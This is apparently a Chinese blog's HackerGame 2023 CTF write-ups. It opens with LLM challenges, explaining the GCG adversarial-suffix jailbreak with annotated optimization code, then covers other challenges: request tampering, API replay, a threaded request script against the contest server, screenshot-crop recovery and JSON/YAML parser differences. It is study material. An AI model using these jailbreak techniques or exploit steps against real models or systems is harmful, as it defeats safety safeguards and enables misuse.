model_outputs = model_outputs[<span class="number">0</span>, <span class="built_in">len</span>(model_inputs[<span class="number">0</span>]):]</span><br><span class="line">    model_output_text = tokenizer.decode(</span><br><span class="line">        model_outputs, skip_special_tokens=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> model_output_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> word, token_id <span class="keyword">in</span> tqdm(tokenizer.get_vocab().items()):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;accepted&#x27;</span> <span class="keyword">in</span> predict(word).lower():</span><br><span class="line">        <span class="built_in">print</span>(word, token_id)</span><br></pre></td></tr></table></figure>

<p>这里的代码就是枚举模型词表里的每一个单词词典,看看哪个词能让 ai 生成 <code>accepted</code>.</p>
<p>跑上面模型生成的结果之一为<code>atively</code>,结果为:</p>
<p><img src="/2023/11/05/HackerGame2023-LLM/image-1.png"></p>
<h2 id="第-3-4-个-flag"><a href="#第-3-4-个-flag" class="headerlink" title="第 3-4 个 flag"></a>第 3-4 个 flag</h2><p>以上两个都是通过找规律获得的答案,接下来会认真解析第三题和第四题,也是拉开区分度的题目,这两道题的题目原型都是 <a href="https://llm-attacks.org/">LLM Attack</a></p>
<h3 id="LLM-补充知识"><a href="#LLM-补充知识" class="headerlink" title="LLM 补充知识"></a>LLM 补充知识</h3><p>在了解 LLM Attack 之前,需要对大模型做非常简要的补充知识。</p>
<p>大模型基于 Transformer 框架, Transformer 架构可以分为以下几个部分:</p>
<h4 id="输入输出部分"><a href="#输入输出部分" class="headerlink" title="输入输出部分"></a>输入输出部分</h4><ul>
<li>将输入单词转换为one hot编码部分</li>
<li>将 one hot 降维成向量的 Embedding 嵌入部分</li>
<li>Transformer 没有递归结构, 所以有记录单词出现顺序的位置编码部分</li>
</ul>
<h4 id="编码器部分"><a href="#编码器部分" class="headerlink" title="编码器部分"></a>编码器部分</h4><p>编码器由多个相同的层堆叠而成，每一层包含两个主要部分：</p>
<ul>
<li><strong>自注意力层</strong>: 在这一层中,对于每个单词,模型学习三个向量:查询(Query),键(Key),值(Value)。其中 Query 是你目前查询到的词的向量, Key 是每一个词的向量,Value 就是 Key 对应的加权值,在这一层中会计算一个注意力分数矩阵,注意力分数矩阵为查询向量和每一个键向量的点乘,然后将注意力分数矩阵做softmax计算得到加权值并应用到 value。</li>
<li><strong>前馈全链接层</strong>:全链接层由 sigmoid+relu+sigmoid 组成,用于将自注意力层的输出结果做非线性变换,使得模型能够学习到更加复杂的特征</li>
</ul>
<p>对于每个子层中都有残差连接（Residual Connection）和层归一化（Layer Normalization），这有助于防止训练过程中的梯度消失问题。</p>
<p>在这里,有多个这样的层,每个层又称为每个头,多个头并行工作,每个头学习到不同关联,最后再堆叠,这又被称为多头注意力机制。</p>
<h4 id="解码器部分"><a href="#解码器部分" class="headerlink" title="解码器部分"></a>解码器部分</h4><p>进入解码器后,他是一个一个单词编码开始读取的。解码器也由多个相同的层堆叠而成，但每一层有三个主要部分：</p>
<ul>
<li><strong>自注意力层</strong>: 在这一层，解码器<strong>首次尝试</strong>理解已经生成的输出序列中的关系,通过解析编码器传来的向量,与编码器中的自注意力层相同,会生成一个输出的注意力分数矩阵,注意这里为了避免他去计算未来(即该单词右边的单词)的分数,会用加上一个 mask 矩阵(mask 矩阵中未来的部分全都是-inf),然后通过 sotfmax 获得加权后的结果(mask 部分为 0)。得到权重再应用于 Value。</li>
<li><strong>编码器-解码器注意力层</strong>: 在这一层,解码器会以自己自注意力层的输出作为 Query,编码器的输出作为 Key 和 Value,然后计算注意力得分,最后通过 softmax 函数进行归一化处理,得到权重再应用于 Value。该层的主要目的是让解码器能够决定在生成下一个token时应该“关注”输入序列的哪个部分。</li>
<li><strong>前馈全链接层</strong>:与编码器部分的一致,做非线性变换。</li>
</ul>
<p>解码器的每个子层同样有残差连接和层归一化。</p>
<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><p>最后，解码器的输出通过一个线性层，然后是一个Softmax层，以预测下一个单词的<strong>概率分布</strong>。</p>
<h3 id="LLM-Attack"><a href="#LLM-Attack" class="headerlink" title="LLM Attack"></a>LLM Attack</h3><p>论文连接: <a href="https://arxiv.org/abs/2307.15043">Universal and Transferable Adversarial Attacks on Aligned Language Models</a></p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><strong>大白话: 通过给用户的输入内容加入合适的后缀,使得大模型说出那些不该说出的话</strong></p>
<p>参考了官方的说法:</p>
<p> LLM 将一串 token $x_{1:n}$ 映射到下一个 token $x_{n+1}$。LLM 所需要学习的是在给定之前的 token $x_{1:n}$ ，得到下一个 token $x_{n+1}$ 的概率 $p(x_{n+1} | x_{1:n})$。其中每一个 $x_i \in {1, … V}$ 都是词表中的一个 token。如果想要让模型输入一段序列，序列中每一个 token 都只与之前的所有 token 有关，因此模型输出一段序列 $x_{n+1:n+H}$ 的概率为</p>
<p>$$p(x_{n+1:n+H}|x_{1:n}) &#x3D; \prod_{i&#x3D;1}^H p(x_{n+i} | x_{1:n+i-1})$$</p>
<p>这里做了概率累乘来叠加概率。</p>
<p>那么根据这个公式,如果我们想让 LLM 输出指定格式的子序列,那么就要让这个子序列的概率尽可能大,即 $p(x_{n+1:n+H}|x_{1:n})$ 尽可能高,那么这就可以转换成一个优化问题,通过梯度下降计算梯度减少损失:<br>$$\mathcal{L}(x_{1:n}) &#x3D; -\log p(x^\star_{n+1:n+H} | x_{1:n})$$</p>
<p>这里的 $x^\star_{n+1:n+H}$ 就是我们想要指定的输出序列。</p>
<p>但由于 LLM 是对离散的 token 做处理,无法记录连续的变化,所以论文的作者参考了 AutoPrompt , 通过贪婪坐标下降(greedy coordinate descent)的方法来对离散输入做优化。算法伪代码如下:</p>
<p><img src="/2023/11/05/HackerGame2023-LLM/image-2.png"></p>
<p>作者首先生成了一个 one hot 向量来代表 token,之后将该 one hot 向量乘上对应模型的 embedding layer 矩阵降维, 然后再输入给模型让他来做梯度下降,经过模型反向传播后,会得到 one hot 对应的梯度向量(每个位置都有一个梯度),这里用  $grad_i$ 表示第 $i$ 个位置的梯度, 如果 $grad_i$ &lt; 0,就代表这个位置的token能够使得损失下降,将原本的 token 替换为词表中的第 $i$ 个 token。算法这里的 $top-k$是指在输出 token 中选择最小的 $k$ 个梯度和对应的 $i$</p>
<p>在论文代码提供的 demo 程序中, 实际代码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plotlosses = PlotLosses()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果不允许非ASCII字符，则设置一个非ASCII字符的禁用列表</span></span><br><span class="line">not_allowed_tokens = <span class="literal">None</span> <span class="keyword">if</span> allow_non_ascii <span class="keyword">else</span> get_nonascii_toks(tokenizer)</span><br><span class="line">adv_suffix = adv_string_init  <span class="comment"># 初始化对抗性后缀</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始多步迭代过程</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_steps):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤1：将用户提示（行为 + 对抗性后缀）编码为tokens，并返回token id。</span></span><br><span class="line">    input_ids = suffix_manager.get_input_ids(adv_string=adv_suffix)</span><br><span class="line">    input_ids = input_ids.to(device)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤2：计算坐标梯度</span></span><br><span class="line">    coordinate_grad = token_gradients(model, </span><br><span class="line">                    input_ids, </span><br><span class="line">                    suffix_manager._control_slice, </span><br><span class="line">                    suffix_manager._target_slice, </span><br><span class="line">                    suffix_manager._loss_slice)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤3：根据坐标梯度采样一批新的tokens。</span></span><br><span class="line">    <span class="comment"># 注意我们只需要那些使损失最小化的tokens。</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 步骤3.1：切片输入以定位对抗性后缀。</span></span><br><span class="line">        adv_suffix_tokens = input_ids[suffix_manager._control_slice].to(device)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 步骤3.2：随机采样一批替换tokens。</span></span><br><span class="line">        new_adv_suffix_toks = sample_control(adv_suffix_tokens, </span><br><span class="line">                       coordinate_grad, </span><br><span class="line">                       batch_size, </span><br><span class="line">                       topk=topk, </span><br><span class="line">                       temp=<span class="number">1</span>, </span><br><span class="line">                       not_allowed_tokens=not_allowed_tokens)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 步骤3.3：确保所有对抗性候选者有相同数量的tokens。</span></span><br><span class="line">        <span class="comment"># 因为tokenizers不是可逆的，Encode(Decode(tokens))可能产生不同的tokenization。</span></span><br><span class="line">        <span class="comment"># 我们确保tokens数量不变，以防止内存持续增长并造成OOM（内存溢出）。</span></span><br><span class="line">        new_adv_suffix = get_filtered_cands(tokenizer, </span><br><span class="line">                                            new_adv_suffix_toks, </span><br><span class="line">                                            filter_cand=<span class="literal">True</span>, </span><br><span class="line">                                            curr_control=adv_suffix)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 步骤3.4：在这些候选者上计算损失，并取最小值。</span></span><br><span class="line">        logits, ids = get_logits(model=model, </span><br><span class="line">                                 tokenizer=tokenizer,</span><br><span class="line">                                 input_ids=input_ids,</span><br><span class="line">                                 control_slice=suffix_manager._control_slice, </span><br><span class="line">                                 test_controls=new_adv_suffix, </span><br><span class="line">                                 return_ids=<span class="literal">True</span>,</span><br><span class="line">                                 batch_size=<span class="number">512</span>)  <span class="comment"># 如果发生OOM，请减少这个数字。</span></span><br><span class="line"></span><br><span class="line">        losses = target_loss(logits, ids, suffix_manager._target_slice)</span><br><span class="line"></span><br><span class="line">        best_new_adv_suffix_id = losses.argmin()</span><br><span class="line">        best_new_adv_suffix = new_adv_suffix[best_new_adv_suffix_id]</span><br><span class="line"></span><br><span class="line">        current_loss = losses[best_new_adv_suffix_id]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 用最佳候选者更新运行中的对抗性后缀</span></span><br><span class="line">        adv_suffix = best_new_adv_suffix</span><br><span class="line">        <span class="comment"># 检查是否成功进行了攻击</span></span><br><span class="line">        is_success = check_for_attack_success(model, </span><br><span class="line">                                 tokenizer,</span><br><span class="line">                                 suffix_manager.get_input_ids(adv_string=adv_suffix).to(device), </span><br><span class="line">                                 suffix_manager._assistant_role_slice, </span><br><span class="line">                                 test_prefixes)</span><br></pre></td></tr></table></figure>

<p>官方给的示例代码中,填补上了 import 部分的代码,然后将用户输入的部分滞空,后缀设置为各自对应最大长度的 ‘!’</p>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p>最后生成出来的效果如下:</p>
<p><img src="/2023/11/05/HackerGame2023-LLM/image-4.png"></p>
<p><img src="/2023/11/05/HackerGame2023-LLM/image-3.png"></p>
]]></content>
      <categories>
        <category>HackerGame</category>
        <category>2023</category>
      </categories>
      <tags>
        <tag>LLM</tag>
      </tags>
  </entry>
  <entry>
    <title>【HackerGame2023】 WriteUp</title>
    <url>/2023/11/04/HackerGame2023/</url>
    <content><![CDATA[<h1 id="HackerGame-2023-WriteUp"><a href="#HackerGame-2023-WriteUp" class="headerlink" title="HackerGame 2023 WriteUp"></a>HackerGame 2023 WriteUp</h1><h2 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h2><p>今年 hackergame 圆满结束，很享受的一次旅程（同时也有点折磨 QAQ），hackergame 这一个星期 ddl 挺多的，所以本次名次并不高，校内 15 名，总排名 226，这篇博客记录的不仅仅是自己做出来的题目的 WP，同时也对官方题解和我感兴趣的题目做一个 log，学习多点知识。</p>
<h2 id="WP-部分"><a href="#WP-部分" class="headerlink" title="WP 部分"></a>WP 部分</h2><h3 id="HackerGame-启动"><a href="#HackerGame-启动" class="headerlink" title="HackerGame 启动"></a>HackerGame 启动</h3><p>签到题，打开题目后让你大声喊出 hackergame 启动！要求准确率到达百分之 99.99%，这是不可能的，上传的时候发现他是在 url 传参的，改一下参数(simularity&#x3D;99.999)就过了。</p>
<p><img src="/2023/11/04/HackerGame2023/1.png"></p>
<h3 id="猫咪小测"><a href="#猫咪小测" class="headerlink" title="猫咪小测"></a>猫咪小测</h3><p>今年猫咪小测一共有四道题：</p>
<p><code>1. 想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？（是一个非负整数） </code></p>
<p>答：这道题给了提示是一个非负整数，而且图书馆不会很高，直接 0-20 爆破就行了。</p>
<p><code>2. 今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？（是一个非负整数） </code></p>
<p>找学术论文这里用中文一定是不可行的，用 chatgpt 翻译成英语：“The upper limit of the density of chickens in the observable universe”，之后再谷歌搜索即可得到论文，答案是 23。</p>
<p><code>3. 为了支持 TCP BBR 拥塞控制算法，在编译 Linux 内核时应该配置好哪一条内核选项？(输入格式为 CONFIG_XXXXX)</code></p>
<p>问 chatgpt，答案为 CONFIG_TCP_CONG_BBR。</p>
<p><code>4. 🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 MyPY mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？（会议的大写英文简称，比如 ISCA、CCS、ICML。）</code></p>
<p>我的做法是直接爆破所有的和 python 有关的学术会议，最后爆破出来是 ECOOP。官方题解则是以”python type check mypy halting problem”为关键词搜索对应的学术论文。</p>
<h3 id="更深更暗"><a href="#更深更暗" class="headerlink" title="更深更暗"></a>更深更暗</h3><p>进去后，提示我们要翻到最底下。<br><img src="/2023/11/04/HackerGame2023/2.png"></p>
<p>我们直接 bp 抓包，看源代码，发现 flag 是 token 的哈希加密值，直接在本地复现即可：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">CryptoJS</span> = <span class="built_in">require</span>(<span class="string">&#x27;crypto-js&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> token =</span><br><span class="line">  <span class="string">&#x27;340:MEQCID15NFRrTG68kB61LStGU/dVdE7xfkJYGlzMvO+UEfRyAiBZn5rm5XJZ4RBT54m7Qdu/fLoKzne1MGfiXFaPbNKuhQ==&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> hash = <span class="title class_">CryptoJS</span>.<span class="title class_">SHA256</span>(<span class="string">`dEEper_@nd_d@rKer_<span class="subst">$&#123;token&#125;</span>`</span>).<span class="title function_">toString</span>(</span><br><span class="line">  <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span></span><br><span class="line">);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`flag&#123;T1t@n_<span class="subst">$&#123;hash.slice(<span class="number">0</span>, <span class="number">32</span>)&#125;</span>&#125;`</span>);</span><br></pre></td></tr></table></figure>

<h3 id="旅行照片-3-0"><a href="#旅行照片-3-0" class="headerlink" title="旅行照片 3.0"></a>旅行照片 3.0</h3><p>一年一度的社工题，这里分享我的做法。</p>
<p><code>题目1-2： 1、你还记得与学长见面这天是哪一天吗？（格式：yyyy-mm-dd） 2、在学校该展厅展示的所有同种金色奖牌的得主中，出生最晚者获奖时所在的研s究所缩写是什么？</code></p>
<p>首先确认时间是在暑假发生，然后仔细观察图片，发现有：</p>
<p><img src="/2023/11/04/HackerGame2023/3.png"></p>
<p>谷歌一搜发现是学术会议 statphys28，一搜发现时间在 8 月 7 日-8 月 11 日举行，举行地点是东京，其实就已经确认了学长是在东京大学读书，时间一个很小的范围，把第二道题确认下来爆破。</p>
<p>第二道题给了一个奖牌，上面有个人名：<strong>M.KOSHIBA</strong></p>
<p>搜索后发现是诺贝尔物理学奖获得者，这里就需要寻找东京大学诺贝尔物理学奖获得者最年轻的那位：</p>
<p><img src="/2023/11/04/HackerGame2023/4.png"></p>
<p>发现是梶田隆章，研究所的缩写为 ICRR，然后根据这个一起去爆破第一问的时间，确认答案为：</p>
<p><strong>2023-8-10</strong>和<strong>ICRR</strong></p>
<p><code>题目3-4 3、帐篷中活动招募志愿者时用于收集报名信息的在线问卷的编号（以字母 S 开头后接数字）是多少？ 4、学长购买自己的博物馆门票时，花费了多少日元？</code></p>
<p>对于第 3 题，谷歌对帐篷图片识图，发现是上野公园，谷歌搜索上野公园 2023 年 8 月 10 日的活动，看到有个梅酒节活动，里面有 staff 大募集，能拿到问卷编号。</p>
<p><img src="/2023/11/04/HackerGame2023/5.png"></p>
<p>对于第 4 题，上野公园的博物馆基本可以确定是东京国立博物馆，直接去搜他的官网，发现他是对大学生免费的，所以答案就是<strong>0</strong></p>
<p><code>题目5-6 5、学长当天晚上需要在哪栋标志性建筑物的附近集合呢？(请用简体中文回答，四个汉字) 6、进站时，你在 JR 上野站中央检票口外看到「ボタン＆カフリンクス」活动正在销售动物周边商品，该活动张贴的粉色背景海报上是什么动物（记作 A，两个汉字）？ 在出站处附近建筑的屋顶广告牌上，每小时都会顽皮出现的那只 3D 动物是什么品种？（记作 B，三个汉字）？（格式：A-B）</code></p>
<p>对于第 5 题，我当时猜测集合地点可能是坐船的地点，然后把浅草那边所有的码头的枚举了都不对，然后仔细看看，发现“学长即将开始他的学术之旅”，就又回去看了看 statphys28，发现他是在晚上举行的，statphys28 的官网有谷歌地图定位：</p>
<p><img src="/2023/11/04/HackerGame2023/6.png"></p>
<p>进去后发现是在<strong>安田讲堂</strong>：</p>
<p><img src="/2023/11/04/HackerGame2023/7.png"></p>
<p>对于第 6 题，直接在推特搜”ボタン＆カフリンクス”</p>
<p><img src="/2023/11/04/HackerGame2023/8.png"></p>
<p>可以确定是个熊猫，第二小问就比较离谱了，我当时没注意看是<strong>出站附近</strong>，以为是上野站附近的广告牌有 3d 小动物，看了很久的街景都没发现有（心想这地方那么村，怎么会有超大的 3d 广告牌），后来没头绪了仔细看了一下，发现是出站，他的第三张图片是去了任天堂马里奥世界，在涩谷，那就很简单了，在涩谷站出站每小时都会顽皮出现的那只 3D 动物就是<strong>秋田犬</strong></p>
<h3 id="赛博井字棋"><a href="#赛博井字棋" class="headerlink" title="赛博井字棋"></a>赛博井字棋</h3><p>这道简单题卡了我挺久 QAQ，进去后抓包看他 script.js 的内容：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">setMove</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (board[x][y] != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (frozen) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> url = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>;</span><br><span class="line">  <span class="keyword">let</span> data = &#123; <span class="attr">x</span>: x, <span class="attr">y</span>: y &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">fetch</span>(url, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data),</span><br><span class="line">  &#125;).<span class="title function_">catch</span>(errorHandler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>仔细思考发现，他这个下棋的判断逻辑是在前端就已经写好了，即<strong>他是通过前端组件对棋盘进行判断的</strong>，这样的话我们直接重放 api 传合法的参数，就能把 ai 下的棋子篡改成我们的棋子，获得 flag：</p>
<p><img src="/2023/11/04/HackerGame2023/9.png"></p>
<h3 id="奶奶的睡前-flag-故事"><a href="#奶奶的睡前-flag-故事" class="headerlink" title="奶奶的睡前 flag 故事"></a>奶奶的睡前 flag 故事</h3><p>这道题我居然没做出来，真的就是没看提示（谷歌亲儿子），我以为是 png 隐写，结果是 pixel 的漏洞，谷歌 pixel 自带的截图编辑工具截出来的图，我们是可以把它已经裁剪过的截图给复原的，用网站：<br><a href="https://acropalypse.app/">https://acropalypse.app</a></p>
<p><img src="/2023/11/04/HackerGame2023/10.png"></p>
<h3 id="组委会模拟器"><a href="#组委会模拟器" class="headerlink" title="组委会模拟器"></a>组委会模拟器</h3><p>Web 编程题，这里需要注意的是，在发送报文的时候，不要等待获取了响应之后再发新的报文，发送了一个报文后马上要<strong>开一个新的线程</strong>去发下一个报文。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 session</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&quot;session&quot;</span>, <span class="string">&quot;eyJ0b2tlbiI6IjM0MDpNRVFDSUQxNU5GUnJURzY4a0I2MUxTdEdVL2RWZEU3eGZrSllHbHpNdk8rVUVmUnlBaUJabjVybTVYSlo0UkJUNTRtN1FkdS9mTG9Lem5lMU1HZmlYRmFQYk5LdWhRPT0ifQ.ZT4eFw.eaokXgOWqIaaKVpIijCDrvuxRLo&quot;</span>, domain=<span class="string">&quot;202.38.93.111&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取消息</span></span><br><span class="line">response = session.post(<span class="string">&quot;http://202.38.93.111:10021/api/getMessages&quot;</span>)</span><br><span class="line">data = response.json()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取所有 hack[...] 格式的消息及其 delay</span></span><br><span class="line">messages = []</span><br><span class="line"><span class="keyword">for</span> i, message <span class="keyword">in</span> <span class="built_in">enumerate</span>(data[<span class="string">&quot;messages&quot;</span>]):</span><br><span class="line">    text = message[<span class="string">&quot;text&quot;</span>]</span><br><span class="line">    delay = message[<span class="string">&quot;delay&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">match</span> := re.search(<span class="string">r&#x27;hack\[\w+\]&#x27;</span>, text)):</span><br><span class="line">        messages.append((i, delay, <span class="keyword">match</span>.group()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对消息按 delay 排序</span></span><br><span class="line">messages.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除消息的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_message</span>(<span class="params">message</span>):</span><br><span class="line">    response = session.post(<span class="string">&quot;http://202.38.93.111:10021/api/deleteMessage&quot;</span>, json=&#123;<span class="string">&quot;id&quot;</span>: message[<span class="number">0</span>]&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Deleted message:&quot;</span>, message[<span class="number">2</span>], <span class="string">&quot;| Response:&quot;</span>, response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送删除请求</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(messages)):</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 等待 delay[i] - delay[i-1] 时间</span></span><br><span class="line">        time.sleep(<span class="built_in">max</span>(<span class="number">0</span>,messages[i][<span class="number">1</span>] - messages[i-<span class="number">1</span>][<span class="number">1</span>]))</span><br><span class="line">    <span class="comment"># 开启新线程来发送删除请求</span></span><br><span class="line">    threading.Thread(target=delete_message, args=(messages[i],)).start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待最后一个消息被删除</span></span><br><span class="line">time.sleep(<span class="built_in">max</span>(<span class="number">0</span>,<span class="number">3</span> - messages[-<span class="number">1</span>][<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 flag</span></span><br><span class="line">time.sleep(<span class="number">2</span>) <span class="comment">#等待所有线程运行完毕</span></span><br><span class="line">response = session.post(<span class="string">&quot;http://202.38.93.111:10021/api/getflag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, response.text&#125;</span><br></pre></td></tr></table></figure>

<p>跑完就能获取到 flag 了。</p>
<p>这里需要探讨一下官方的做法。</p>
<p>官方的做法是在浏览器里嵌入脚本：他这里的脚本就是每隔 100 毫秒查找出网页中包含 flag 的所有可点击的消息元素，然后点击它。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(</span><br><span class="line">  <span class="function">() =&gt;</span></span><br><span class="line">    <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.fakeqq-message__bubble&#x27;</span>))</span><br><span class="line">      .<span class="title function_">filter</span>(<span class="function">(<span class="params">element</span>) =&gt;</span> element.<span class="property">innerHTML</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;hack[&#x27;</span>) != -<span class="number">1</span>)</span><br><span class="line">      .<span class="title function_">forEach</span>(<span class="function">(<span class="params">element</span>) =&gt;</span> element.<span class="title function_">click</span>()),</span><br><span class="line">  <span class="number">100</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>“右键检查或按下 F12 键打开浏览器的开发者工具，选择「控制台」。将该脚本粘贴到控制台中，刷新页面（以重新开始题目）后按下回车执行脚本，就能自动撤回了。所有消息加载完毕后再稍等几秒，即可看到真正的 flag。”</p>
<h3 id="虫"><a href="#虫" class="headerlink" title="虫"></a>虫</h3><p>满扫描电视，SSTV 图片传输，这里可以直接使用解码的脚本解码，跑出来直接就有 flag 了。</p>
<p>官方的解法使用解码软件，Linux 上的 QSSTV，然后使用 PipeWire 将播放器音频连接到 QSSTV 输入，解码获得到 flag。</p>
<h3 id="JSON-⊂-YAML"><a href="#JSON-⊂-YAML" class="headerlink" title="JSON ⊂ YAML?"></a>JSON ⊂ YAML?</h3><p>题目：</p>
<p>你知道吗？Hackergame 出题时，每道题都需要出题人用 YAML 格式写下题目的关键信息。然而，每年总有一些出题人在编写 YAML 文件时被复杂的语法规则弄得头疼不已。</p>
<p>这天小 Z 又找到小 W 说：「我昨天写 YAML 时，又花了半天研究 YAML 的规范，YAML 好难啊！」</p>
<p>小 W 惊讶道：「怎么会有人不会写 YAML 呢？只要你会写 JSON 就会写 YAML 呀，因为任何合法的 JSON 本身就是合法的 YAML。」</p>
<p>小 Z 听闻这番言论后当场表示怀疑，立刻说出了一个字符串，JSON 和 YAML 解析出的含义存在差异。小 W 研究了一番才发现，这是因为很多主流的 YAML 库仍然是 YAML 1.1 的，它没有这个性质。他不得不承认：「好吧，这个性质只适用于 YAML 1.2。」</p>
<p>小 Z 笑了：「别提 YAML 1.2 了，它遇到合法的 JSON 都有可能报错。」</p>
<p>这个题目很有意思，就是 JSON 和 YAML 文件合法性的检查，要找两个，分别是</p>
<ul>
<li>JSON 和 YAML1.1</li>
<li>JSON 和 YAML1.2</li>
</ul>
<p>JSON 和 YAML 都是一种序列化格式。对于 JSON 和 YAML1.1：</p>
<p>我们先来对比 JSON 和 YAML1.1 的格式，JSON 中的数字格式是严格额，不能用前导正号，前导 0，小数点后面必须有数字。而 YAML1.1 是很宽松的，并没有一个确定的规则来决定一个未标注类型的字符串应该被解释成扫描类型，对于科学计数法，它<strong>强调小数点是必须的</strong>，所以在这个题中，可以构建<strong>1e1</strong>来获得 flag，在 JSON 中它会被解释成 10，而在 YAML1.1 中就是 1e1 这个字符串，因为他没有小数点。</p>
<p>官方给的解释中，提到了两条规则：</p>
<ol>
<li>是否有小数点</li>
<li>指数部分是否有正负号</li>
</ol>
<p>这两条规则都可以导致 JSON 和 YAML 解释不一样。</p>
<p>对于 JSON 和 YAML1.2：</p>
<p>YAML1.2 中明确规定了在遇到重复的键时必须报错，所以这里绕过比较简单，就是构造两个键名一样的参数即可。</p>
<p>最后结果：</p>
<p><img src="/2023/11/04/HackerGame2023/11.png" alt="Alt text"></p>
<h3 id="Git-Git"><a href="#Git-Git" class="headerlink" title="Git? Git"></a>Git? Git</h3><p>题目：<br>「幸亏我发现了……」马老师长吁了一口气。</p>
<p>「马老师，发生甚么事了？」马老师的一位英国研究生问。</p>
<p>「刚刚一不小心，把 flag 提交到本地仓库里了。」马老师回答，「还好我发现了，撤销了这次提交，不然就惨了……」</p>
<p>「这样啊，那太好了。」研究生说。</p>
<p>马老师没想到的是，这位年轻人不讲武德，偷偷把他的本地仓库拷贝到了自己的电脑上，然后带出了实验室，想要一探究竟…</p>
<p>我的方法简单粗暴，就是写一段脚本遍历所有 git 对象，然后打印出来，看看长不长，不长的话直接在里面找 flag，在本地文件夹 touch 建立一个文件，用 vim 打开，复制脚本：</p>
